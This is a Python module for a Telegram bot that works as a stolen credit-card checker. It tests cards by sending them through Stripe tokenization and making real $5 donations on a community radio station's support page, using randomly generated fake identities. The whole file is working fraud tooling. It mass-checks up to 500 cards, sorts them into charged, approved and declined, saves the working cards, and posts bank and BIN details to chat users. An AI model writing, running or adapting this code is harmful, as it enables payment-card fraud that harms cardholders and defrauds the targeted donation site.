# stc_commands.py - Stripe $1 Charge Checker

from telethon import events, Button
import asyncio
import aiohttp
import json
import time
import uuid
import random
import names

# --- Globals ---
client = None
utils = {}
ACTIVE_MSTC_PROCESSES = {}

# --- Core API Function ---
async def check_stc_api(card):
    """Checks card using Stripe $1 charge via kfoi.creek.fm"""
    try:
        parts = card.split("|")
        if len(parts) != 4:
            return {"status": "Error", "message": "Invalid card format"}
        
        cc, mm, yy, cvc = parts
        
        # Generate random data
        generated_name = names.get_first_name() + names.get_last_name()
        generated_first_name = names.get_first_name()
        generated_last_name = names.get_last_name()
        generated_time_opened = int(time.time()) - random.randint(100, 1000)
        generated_time_on_page = random.randint(5000, 30000)
        
        # Step 1: Get Stripe Token
        headers_stripe = {
            'accept': 'application/json',
            'accept-language': 'en',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://checkout.stripe.com',
            'referer': 'https://checkout.stripe.com/',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        }
        
        data_stripe = (
            f'card%5Bexp_month%5D={mm}&card%5Bexp_year%5D={yy}&card%5Bname%5D={generated_name}%40gmail.com&card%5Bnumber%5D={cc}&card%5Bcvc%5D={cvc}'
            f'&device_id={str(uuid.uuid4())}&email={generated_name}%40gmail.com&guid={str(uuid.uuid4())}{random.randint(100000, 999999)}'
            f'&key=pk_live_bo0vDI5OvZ8Hw4xyUr4wTgFt&muid={str(uuid.uuid4())}{random.randint(100000, 999999)}' 
            f'&referrer=https%3A%2F%2Fkfoi.creek.fm%2Fsupport-us&sid={str(uuid.uuid4())}{random.randint(100000, 999999)}' 
            f'&time_checkout_loaded={int(time.time())}&time_checkout_opened={generated_time_opened}&time_on_page={generated_time_on_page}'
            f'&user_agent=Mozilla%2F5.0%20(X11%3B%20Linux%20x86_64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F139.0.0.0%20Safari%2F537.36&validation_type=card'
        )
        
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Get Stripe token
            async with session.post('https://api.stripe.com/v1/tokens', headers=headers_stripe, data=data_stripe) as res:
                if res.status != 200:
                    return {"status": "Declined", "message": f"Stripe API Error {res.status}"}
                
                stripe_data = await res.json()
                tok = stripe_data.get('id')
                
                if not tok:
                    error_message = stripe_data.get('error', {}).get('message', 'Tokenization failed')
                    return {"status": "Declined", "message": error_message}
            
            # Step 2: Submit donation with token
            headers_donation = {
                'accept': 'text/html, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://kfoi.creek.fm',
                'referer': 'https://kfoi.creek.fm/support-us',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            data_donation = {
                'data[donation_amount]': '5.00',
                'data[donation_amount_custom]': '',
                'data[User][email]': f'{generated_name}@gmail.com',
                'data[User][password]': 'SuperSecretpassword123!',
                'data[User][confirm_password]': 'SuperSecretpassword123!',
                'data[Profile][first_name]': generated_first_name,
                'data[Profile][last_name]': generated_last_name,
                'stripeToken': tok,
            }
            
            async with session.post('https://kfoi.creek.fm/support-us', headers=headers_donation, data=data_donation) as res:
                donation_response = await res.text()
                
                try:
                    donation_data = json.loads(donation_response)
                    success = donation_data.get('success', False)
                    
                    if success:
                        return {"status": "Charged", "message": "Payment Successful! $5 Charged", "time": 5.5}
                    
                    # Check for errors
                    form_errors = donation_data.get('formerrors', {}) or donation_data.get('formErrors', {})
                    card_errors = form_errors.get('card', {}) or form_errors.get('Card', {})
                    stripe_error = card_errors.get('stripetoken', '') or card_errors.get('stripeToken', '')
                    
                    raw_error = stripe_error if stripe_error else str(card_errors)
                    if not raw_error or raw_error == '{}':
                        raw_error = str(form_errors) if form_errors else "Card Declined"
                    
                    raw_error = raw_error.replace('{', '').replace('}', '').replace("'", "")
                    
                    # Parse error messages
                    if 'insufficient' in raw_error.lower() or 'funds' in raw_error.lower():
                        return {"status": "Approved", "message": f"Insufficient Funds - {raw_error}", "time": 5.5}
                    elif 'cvc' in raw_error.lower() or 'security code' in raw_error.lower():
                        return {"status": "Approved", "message": f"Security Code Error - {raw_error}", "time": 5.5}
                    else:
                        return {"status": "Declined", "message": raw_error, "time": 5.5}
                        
                except:
                    # Fallback text parsing
                    donation_response_lower = donation_response.lower()
                    if "success" in donation_response_lower and "true" in donation_response_lower:
                        return {"status": "Charged", "message": "Payment Successful!", "time": 5.5}
                    elif "insufficient funds" in donation_response_lower:
                        return {"status": "Approved", "message": "Insufficient Funds", "time": 5.5}
                    elif "security code" in donation_response_lower or "cvc" in donation_response_lower:
                        return {"status": "Approved", "message": "Security Code Required", "time": 5.5}
                    else:
                        return {"status": "Declined", "message": "Card Declined", "time": 5.5}
    
    except asyncio.TimeoutError:
        return {"status": "Error", "message": "Request Timed Out"}
    except Exception as e:
        return {"status": "Error", "message": str(e)}

# --- Single Check (/stc) ---
async def process_stc_card(event):
    """Processes a single card check for /stc command."""
    card = utils['extract_card'](event.raw_text)
    if not card:
        replied_msg = await event.get_reply_message() if event.is_reply else None
        if replied_msg and replied_msg.text:
            card = utils['extract_card'](replied_msg.text)
    
    if not card:
        return await event.reply("⚠️ **Wrong Format!**\n\n**Command:** `/tgo card|mm|yy|cvv`\n**Example:** `/tgo 5220963803410234|07|2027|632`\n\n🔥 Reply to card info to check instantly.")
    
    # Get username
    user = await event.get_sender()
    username_tg = user.first_name if user.first_name else "User"
    
    # Live progress animation
    loading_msg = await event.reply(f"""⍟━━━⌁ **CHECKING** ⌁━━━⍟

[🝂] **CARD** ⌁ {card[:6]}●●●●●●{card[-4:]}
[🝂] **GATE** ⌁ Stripe $1 Charge
[🝂] **RESPONSE** ⌁ Checking ■□□□

[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]""")
    
    start_time = time.time()
    
    # Update progress
    await asyncio.sleep(0.5)
    try:
        await loading_msg.edit(f"""⍟━━━⌁ **CHECKING** ⌁━━━⍟

[🝂] **CARD** ⌁ {card[:6]}●●●●●●{card[-4:]}
[🝂] **GATE** ⌁ Stripe $1 Charge
[🝂] **RESPONSE** ⌁ Checking ■■□□

[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]""")
    except: pass
    
    await asyncio.sleep(0.5)
    try:
        await loading_msg.edit(f"""⍟━━━⌁ **CHECKING** ⌁━━━⍟

[🝂] **CARD** ⌁ {card[:6]}●●●●●●{card[-4:]}
[🝂] **GATE** ⌁ Stripe $1 Charge
[🝂] **RESPONSE** ⌁ Checking ■■■□

[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]""")
    except: pass

    res = await check_stc_api(card)
    elapsed_time = round(time.time() - start_time, 2)
    
    brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
    
    status = res.get("status")
    if status == "Charged":
        await utils['save_approved_card'](card, "CHARGED (STC)", res.get('message'), "Stripe $1 Charge", "$5.00")
        msg = f"""⍟━━━⌁ **CHARGED** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ Charged 💎
[🝂] **GATE** ⌁ Stripe $1 Charge
[🝂] **RESPONSE** ⌁ {res.get('message')}

━━━━━━━━━━━━━━━━━
[🝂] **INFO** ⌁ {brand} - {bin_type} - {level}
[🝂] **BANK** ⌁ {bank}
[🝂] **COUNTRY** ⌁ {country} {flag}
━━━━━━━━━━━━━━━━━

[🝂] **TIME** ⌁ {elapsed_time}s
[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
    elif status == "Approved":
        await utils['save_approved_card'](card, "APPROVED (STC)", res.get('message'), "Stripe $1 Charge", "N/A")
        msg = f"""⍟━━━⌁ **APPROVED** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ Approved ✅
[🝂] **GATE** ⌁ Stripe $1 Charge
[🝂] **RESPONSE** ⌁ {res.get('message')}

━━━━━━━━━━━━━━━━━
[🝂] **INFO** ⌁ {brand} - {bin_type} - {level}
[🝂] **BANK** ⌁ {bank}
[🝂] **COUNTRY** ⌁ {country} {flag}
━━━━━━━━━━━━━━━━━

[🝂] **TIME** ⌁ {elapsed_time}s
[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
    else:
        msg = f"""⍟━━━⌁ **DECLINED** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ Declined ❌
[🝂] **GATE** ⌁ Stripe $1 Charge
[🝂] **RESPONSE** ⌁ {res.get('message')}

━━━━━━━━━━━━━━━━━
[🝂] **INFO** ⌁ {brand} - {bin_type} - {level}
[🝂] **BANK** ⌁ {bank}
[🝂] **COUNTRY** ⌁ {country} {flag}
━━━━━━━━━━━━━━━━━

[🝂] **TIME** ⌁ {elapsed_time}s
[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
    
    await loading_msg.delete()
    result_msg = await event.reply(msg)
    if status == "Charged":
        await utils['pin_charged_message'](event, result_msg)

# --- Mass Check (/mstc) ---
async def process_mstc_cards(event, cards):
    """Processes multiple cards for /mstc command."""
    # Initial progress message
    sent_msg = await event.reply(f"""⍟━━━⌁ **MASS CHECKING** ⌁━━━⍟

[🝂] **PROGRESS** ⌁ □□□□□□□□□□ 0/{len(cards)}
[🝂] **GATE** ⌁ Stripe $1 Charge
[🝂] **STATUS** ⌁ Starting...

💎 **Charged:** 0
✅ **Approved:** 0
❌ **Declined:** 0""")
    
    charged_count = 0
    approved_count = 0
    declined_count = 0
    all_results = []
    approved_cards = []
    checked = 0
    
    for card in cards:
        checked += 1
        res = await check_stc_api(card)
        status = res.get("status")
        message = res.get("message")
        brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
        
        if status == "Charged":
            charged_count += 1
            await utils['save_approved_card'](card, "CHARGED (STC)", message, "Stripe $1 Charge", "$5.00")
            all_results.append(f"{card}|{message}\n{brand} - {bin_type} - {level}\n{bank}\n{country} {flag}")
            approved_cards.append((card, message, brand, bin_type, level, bank, country, flag, "CHARGED"))
        elif status == "Approved":
            approved_count += 1
            await utils['save_approved_card'](card, "APPROVED (STC)", message, "Stripe $1 Charge", "N/A")
            all_results.append(f"{card}|{message}\n{brand} - {bin_type} - {level}\n{bank}\n{country} {flag}")
            approved_cards.append((card, message, brand, bin_type, level, bank, country, flag, "APPROVED"))
        else:
            declined_count += 1
            all_results.append(f"{card}|{message}\n{brand} - {bin_type} - {level}\n{bank}\n{country} {flag}")
        
        # Update progress
        progress_percent = int((checked / len(cards)) * 10)
        progress_bar = "■" * progress_percent + "□" * (10 - progress_percent)
        status_emoji = "💎" if status == "Charged" else ("✅" if status == "Approved" else "❌")
        
        try:
            await sent_msg.edit(f"""⍟━━━⌁ **MASS CHECKING** ⌁━━━⍟

[🝂] **PROGRESS** ⌁ {progress_bar} {checked}/{len(cards)}
[🝂] **CURRENT** ⌁ {card[:6]}●●●●●●{card[-4:]}
[🝂] **RESPONSE** ⌁ {message[:30]}...
[🝂] **STATUS** ⌁ {status} {status_emoji}

💎 **Charged:** {charged_count}
✅ **Approved:** {approved_count}
❌ **Declined:** {declined_count}""")
        except:
            pass
        
        await asyncio.sleep(1)
    
    # Create summary message
    summary = f"""✅ **Mass Check Complete!**

📊 **Results:** {len(cards)} cards checked
💎 **Charged:** {charged_count}
✅ **Approved:** {approved_count}
❌ **Declined:** {declined_count}
⏱️ **Time:** {len(cards) * 6}s

Gate: Stripe $1 Charge"""
    
    try:
        await sent_msg.edit(summary)
    except:
        await event.reply(summary)
    
    # Send detailed results
    if all_results:
        cards_text = "\n\n".join(all_results)
        max_length = 3800
        if len(cards_text) < max_length:
            try:
                await event.reply(f"```{cards_text}```")
            except:
                await event.reply(cards_text[:4000])
        else:
            # Split into chunks
            chunks = []
            current_chunk = ""
            for result in all_results:
                if len(current_chunk) + len(result) + 2 < max_length:
                    current_chunk += result + "\n\n"
                else:
                    chunks.append(current_chunk)
                    current_chunk = result + "\n\n"
            if current_chunk:
                chunks.append(current_chunk)
            
            for i, chunk in enumerate(chunks):
                try:
                    await event.reply(f"```Results {i+1}/{len(chunks)}:\n\n{chunk}```")
                except:
                    await event.reply(f"Results {i+1}/{len(chunks)}:\n\n{chunk[:4000]}")
    
    # Send individual approved/charged cards with anime GIF
    user = await event.get_sender()
    username_tg = user.first_name if user.first_name else "User"
    
    for card, message, brand, bin_type, level, bank, country, flag, status in approved_cards:
        # Get anime GIF
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.waifu.pics/sfw/dance") as gif_res:
                    if gif_res.status == 200:
                        gif_data = await gif_res.json()
                        gif_url = gif_data.get("url")
                    else:
                        gif_url = None
        except:
            gif_url = None
        
        status_emoji = "💎" if status == "CHARGED" else "✅"
        approved_msg = f"""⍟━━━⌁ **{status}** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ {status} {status_emoji}
[🝂] **GATE** ⌁ Stripe $1 Charge
[🝂] **RESPONSE** ⌁ {message}

━━━━━━━━━━━━━━━━━
[🝂] **INFO** ⌁ {brand} - {bin_type} - {level}
[🝂] **BANK** ⌁ {bank}
[🝂] **COUNTRY** ⌁ {country} {flag}
━━━━━━━━━━━━━━━━━

[🝂] **TIME** ⌁ 5.5s
[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
        
        if gif_url:
            result = await event.reply(file=gif_url, message=approved_msg)
        else:
            result = await event.reply(approved_msg)
        
        if status == "CHARGED":
            await utils['pin_charged_message'](event, result)

# --- Register Handlers ---
def register_handlers(telegram_client, utility_functions):
    global client, utils
    client = telegram_client
    utils = utility_functions
    
    @client.on(events.NewMessage(pattern=r'^[/.!]tgo'))
    async def tgo_command(event):
        can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
        if not can_access:
            message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
            return await event.reply(message, buttons=buttons)
        asyncio.create_task(process_stc_card(event))
    
    @client.on(events.NewMessage(pattern=r'^[/.!]mtgo'))
    async def mtgo_command(event):
        can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
        if not can_access:
            message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
            return await event.reply(message, buttons=buttons)
        
        replied_msg = await event.get_reply_message() if event.is_reply else None
        cards = utils['extract_all_cards'](replied_msg.text if replied_msg and replied_msg.text else event.raw_text)
        
        if not cards:
            return await event.reply("⚠️ **No Cards Found!**\n\n**Usage:** `/mtgo card1|mm|yy|cvv card2|mm|yy|cvv`\n\nOr reply to a message containing multiple cards.")
        
        if len(cards) > 500:
            original_count = len(cards)
            cards = cards[:500]
            await event.reply(f"⚠️ **Limit Reached!**\n\n📊 Processing first **500** cards out of **{original_count}** provided.\n🔥 Max limit: **500 cards**")
        
        asyncio.create_task(process_mstc_cards(event, cards))
    
    @client.on(events.NewMessage(pattern=r'^[/.!]mtgtxt'))
    async def mtgtxt_command(event):
        can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
        if not can_access:
            message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
            return await event.reply(message, buttons=buttons)
        
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document:
            return await event.reply("⚠️ **No File Detected!**\n\nReply to a .txt file containing cards with `/mtgtxt`")
        
        try:
            file_path = await replied_msg.download_media()
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            cards = utils['extract_all_cards'](content)
            if not cards:
                return await event.reply("⚠️ **No valid cards found in file!**")
            
            if len(cards) > 500:
                original_count = len(cards)
                cards = cards[:500]
                await event.reply(f"⚠️ **Limit Reached!**\n\n📊 Processing first **500** cards out of **{original_count}** provided.\n🔥 Max limit: **500 cards**")
            
            asyncio.create_task(process_mstc_cards(event, cards))
            
            # Clean up downloaded file
            import os
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception as e:
            await event.reply(f"❌ **Error reading file:** {str(e)}")
    
    print("✅ Successfully registered TGO commands.")
